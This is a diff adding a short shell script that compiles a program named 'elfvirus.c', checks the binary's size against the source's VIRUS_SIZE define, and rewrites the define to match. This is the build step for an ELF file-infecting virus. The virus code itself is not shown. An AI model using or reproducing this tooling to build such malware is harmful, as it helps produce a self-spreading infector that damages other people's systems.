@@ -1,0 +1,14 @@
+#!/bin/sh
+gcc -o elfvirus elfvirus.c
+FILESIZE=`ls -l elfvirus|awk '$5 {print $5}'`
+PROGSIZE=`awk '/define VIRUS_SIZE/ {print $3}' elfvirus.c`
+if [ $FILESIZE -eq $PROGSIZE ];then
+        echo File sizes are correct...Ready to Roll!
+else
+        echo File size do not match!
+        echo "Modifying source defines to VIRUS_SIZE $FILESIZE."
+        awk ' {if(/define VIRUS_SIZE/) print "#define VIRUS_SIZE "'$FILESIZE'; else print $0}' elfvirus.c > elfvirus.c.new
+        mv elfvirus.c elfvirus.c.bak
+        mv elfvirus.c.new elfvirus.c
+        ./create
+fi
